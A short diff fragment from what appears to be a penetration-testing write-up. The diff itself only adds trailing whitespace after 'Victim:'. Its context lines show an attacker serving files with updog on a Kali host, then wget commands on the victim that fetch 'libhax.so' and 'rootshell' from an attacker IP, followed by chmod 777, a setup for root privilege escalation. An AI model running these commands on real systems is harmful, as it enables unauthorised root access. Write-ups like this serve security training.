@@ -153,7 +153,7 @@ Kali:
 `cd /var/tmp`  
 `updog -p 80`
 
-Victim:
+Victim:  
 `wget http://192.168.45/libhax.so`  
  `wget http://192.168.45/rootshell`  
 `chmod 777 *`  
